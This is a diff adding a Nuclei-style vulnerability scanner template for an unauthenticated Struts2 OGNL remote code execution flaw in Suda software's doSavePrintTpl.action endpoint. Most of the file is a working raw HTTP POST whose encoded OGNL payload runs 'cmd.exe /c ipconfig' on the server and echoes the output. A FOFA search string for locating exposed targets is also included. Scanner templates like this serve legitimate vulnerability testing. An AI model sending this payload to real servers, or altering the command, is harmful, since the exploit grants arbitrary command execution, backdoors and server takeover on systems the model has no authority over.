@@ -1,0 +1,30 @@
+http:
+    - matchers:
+        - part: body
+          type: word
+          words:
+            - Windows IP
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /common/print/print!doSavePrintTpl.action HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+          Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+          redirect:%24%7B%23resp%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29%2C%23req%3D%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29%2C%23a%3D%28new+java.lang.ProcessBuilder(new+java.lang.String[]{'cmd.exe','/c','ipconfig'})).start%28%29%2C%23b%3D%23a.getInputStream%28%29%2C%23dis%3Dnew+java.io.DataInputStream%28%23b%29%2C%23buf%3Dnew+byte%5B20000%5D%2C%23dis.read%28%23buf%29%2C%23msg%3Dnew+java.lang.String%28%23buf%29%2C%23dis.close%28%29%2C%23resp.getWriter%28%29.println%28%23msg.trim%28%29%29%2C%23resp.getWriter%28%29.flush%28%29%2C%23resp.getWriter%28%29.close%28%29%7D=
+id: suda-doSavePrintTpl_action-Struts2-rce
+info:
+    author: Superhero
+    description: |-
+        fofa: body="速达软件技术（广州）有限公司" && body="jslib/extjs2.3/view/PasswordField.js"
+        由于速达软件 多款产品使用Struts2开发框架组件，存在历史Struts2远程代码执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统命令，写入后门文件，获取服务器权限。
+    name: 速达软件 多款产品 doSavePrintTpl.action Struts2远程代码执行漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/tZ6ftUl8zLYxC6ALQG_49A
+    severity: high
+    tags:
+        - RCE
